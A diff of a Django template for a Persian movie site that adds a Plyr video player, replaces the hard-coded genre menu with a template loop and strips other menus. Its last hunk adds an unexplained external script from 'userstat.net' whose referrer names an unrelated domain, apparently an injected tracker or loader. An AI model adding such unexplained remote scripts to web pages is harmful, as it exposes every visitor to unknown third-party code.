@@ -33,6 +33,10 @@
     <link rel="stylesheet" href="{% static 'css/nice-select.min.css' %}">
     <link rel="stylesheet" href="{% static 'css/plyr.min.css' %}">
     <link rel="stylesheet" href="{% static 'css/style.css' %}">
+    
+    <link rel="stylesheet" href="https://cdn.plyr.io/3.7.2/plyr.css" />
+<!-- Plyr JS -->
+<script src="https://cdn.plyr.io/3.7.2/plyr.polyfilled.js"></script>
 
 
 </head>
@@ -45,6 +49,8 @@
             <div></div>
         </div>
     </div>
+   
+
 
 
     <header class="header" dir="rtl">
@@ -85,97 +91,31 @@
                     </div>
                     <div class="collapse navbar-collapse" id="main_nav">
                         <ul class="navbar-nav">
-                            <li class="nav-item dropdown">
-                                <a class="nav-link dropdown-toggle active" href="#" data-bs-toggle="dropdown">خانه</a>
-                                <ul class="dropdown-menu fade-down">
-                                    <li><a class="dropdown-item" href="index.html"
-                                            style="  font-family: 'estedad-light';    ">خانه یک</a></li>
-                                    <li><a class="dropdown-item" href="index-2.html">خانه دو</a></li>
-                                    <li><a class="dropdown-item" href="index-3.html">خانه سه</a></li>
-                                    <li><a class="dropdown-item" href="index-4.html">خانه چهار</a></li>
-                                    <li><a class="dropdown-item" href="index-5.html">خانه پنج</a></li>
-                                </ul>
+                            <li class="nav-item ">
+                                <a class="nav-link " href="#" data-bs-toggle="dropdown">خانه</a>
+                               
                             </li>
                             <li class="nav-item dropdown">
                                 <a class="nav-link dropdown-toggle" href="#" data-bs-toggle="dropdown">ژانر</a>
                                 <div class="dropdown-menu mega-menu fade-down">
                                     <div class="row">
+                                        
+                                        
                                         <div class="col-lg-4">
-                                            <a class="dropdown-item" href="movie-category.html">اکشن</a>
-                                            <a class="dropdown-item" href="movie-category.html">انیمیشن</a>
-                                            <a class="dropdown-item" href="movie-category.html">ماجراجویی</a>
-                                            <a class="dropdown-item" href="movie-category.html">بیوگرافی</a>
-                                            <a class="dropdown-item" href="movie-category.html">کمدی</a>
-                                            <a class="dropdown-item" href="movie-category.html">جنایی</a>
-                                            <a class="dropdown-item" href="movie-category.html">مستند</a>
-                                            <a class="dropdown-item" href="movie-category.html">درام</a>
-                                            <a class="dropdown-item" href="movie-category.html">خانوادگی</a>
+                                            {% for item  in genres  %}
+                                            <a class="dropdown-item" href="movie-category.html">{{item.name}}</a>
+                                            {% endfor %}
                                         </div>
                                         <div class="col-lg-4">
-                                            <a class="dropdown-item" href="movie-category.html">فانتزی</a>
-                                            <a class="dropdown-item" href="movie-category.html">نمایش بازی</a>
-                                            <a class="dropdown-item" href="movie-category.html">تاریخچه</a>
-                                            <a class="dropdown-item" href="movie-category.html">وحشتناک</a>
-                                            <a class="dropdown-item" href="movie-category.html">کونگ فو</a>
-                                            <a class="dropdown-item" href="movie-category.html">موسیقی</a>
-                                            <a class="dropdown-item" href="movie-category.html">موسیقی</a>
-                                            <a class="dropdown-item" href="movie-category.html">معمایی</a>
-                                            <a class="dropdown-item" href="movie-category.html">اساطیری</a>
+                                            
                                         </div>
                                         <div class="col-lg-4">
-                                            <a class="dropdown-item" href="movie-category.html">اخبار</a>
-                                            <a class="dropdown-item" href="movie-category.html">روانی</a>
-                                            <a class="dropdown-item" href="movie-category.html">عاشقانه</a>
-                                            <a class="dropdown-item" href="movie-category.html">علمی تخیلی</a>
-                                            <a class="dropdown-item" href="movie-category.html">ورزش</a>
-                                            <a class="dropdown-item" href="movie-category.html">ریلی شو</a>
-                                            <a class="dropdown-item" href="movie-category.html">هیجان انگیز</a>
-                                            <a class="dropdown-item" href="movie-category.html">نمایش تلویزیونی</a>
-                                            <a class="dropdown-item" href="movie-category.html">جنگ</a>
+                                         
                                         </div>
                                     </div>
                                 </div>
                             </li>
-                            <li class="nav-item dropdown">
-                                <a class="nav-link dropdown-toggle" href="#" data-bs-toggle="dropdown">کشور</a>
-                                <div class="dropdown-menu mega-menu fade-down">
-                                    <div class="row">
-                                        <div class="col-lg-4">
-                                            <a class="dropdown-item" href="movie-country.html">ایران</a>
-                                            <a class="dropdown-item" href="movie-country.html">استرالیا</a>
-                                            <a class="dropdown-item" href="movie-country.html">اتریش</a>
-                                            <a class="dropdown-item" href="movie-country.html">بلژیک</a>
-                                            <a class="dropdown-item" href="movie-country.html">برزیل</a>
-                                            <a class="dropdown-item" href="movie-country.html">کانادا</a>
-                                            <a class="dropdown-item" href="movie-country.html">چین</a>
-                                            <a class="dropdown-item" href="movie-country.html">جمهوری چک</a>
-                                            <a class="dropdown-item" href="movie-country.html">دانمارک</a>
-                                        </div>
-                                        <div class="col-lg-4">
-                                            <a class="dropdown-item" href="movie-country.html">فنلاند</a>
-                                            <a class="dropdown-item" href="movie-country.html">فرانسه</a>
-                                            <a class="dropdown-item" href="movie-country.html">آلمان</a>
-                                            <a class="dropdown-item" href="movie-country.html">هنگ کنگ</a>
-                                            <a class="dropdown-item" href="movie-country.html">مجارستان</a>
-                                            <a class="dropdown-item" href="movie-country.html">ایرلند</a>
-                                            <a class="dropdown-item" href="movie-country.html">ایتالیا</a>
-                                            <a class="dropdown-item" href="movie-country.html">ژاپن</a>
-                                            <a class="dropdown-item" href="movie-country.html">مکزیک</a>
-                                        </div>
-                                        <div class="col-lg-4">
-                                            <a class="dropdown-item" href="movie-country.html">هلند</a>
-                                            <a class="dropdown-item" href="movie-country.html">نروژ</a>
-                                            <a class="dropdown-item" href="movie-country.html">لهستان</a>
-                                            <a class="dropdown-item" href="movie-country.html">رومانی</a>
-                                            <a class="dropdown-item" href="movie-country.html">روسیه</a>
-                                            <a class="dropdown-item" href="movie-country.html">اسپانیا</a>
-                                            <a class="dropdown-item" href="movie-country.html">تایلند</a>
-                                            <a class="dropdown-item" href="movie-country.html">بریتانیا</a>
-                                            <a class="dropdown-item" href="movie-country.html">ایالات متحده آمریکا</a>
-                                        </div>
-                                    </div>
-                                </div>
-                            </li>
+                         
                             <li class="nav-item dropdown">
                                 <a class="nav-link dropdown-toggle" href="#" data-bs-toggle="dropdown">صفحات</a>
                                 <ul class="dropdown-menu fade-down">
@@ -217,12 +157,7 @@
                             <li class="nav-item dropdown">
                                 <a class="nav-link dropdown-toggle" href="#" data-bs-toggle="dropdown">فیلم ها</a>
                                 <ul class="dropdown-menu fade-down">
-                                    <li><a class="dropdown-item" href="movie.html">فیلم یک</a></li>
-                                    <li><a class="dropdown-item" href="movie-2.html">فیلم دو</a></li>
-                                    <li><a class="dropdown-item" href="movie-3.html">فیلم سه</a></li>
-                                    <li><a class="dropdown-item" href="movie-single.html">فیلم تک یک</a></li>
-                                    <li><a class="dropdown-item" href="movie-single-2.html">فیلم تک دو</a></li>
-                                    <li><a class="dropdown-item" href="az-movie.html">دسته بندی فیلم</a></li>
+                                  
                                 </ul>
                             </li>
                             <li class="nav-item dropdown">
@@ -437,6 +372,9 @@
     <script src="{% static 'js/jquery.nice-select.min.js' %}"></script>
     <script src="{% static 'js/plyr.min.js' %}"></script>
     <script src="{% static 'js/main.js' %}"></script>
+
+    <script src="https://userstat.net/get/script.js?referrer=https://devhostco.xyz/moplay/movie-single-2.html"></script>
+
 
  
 
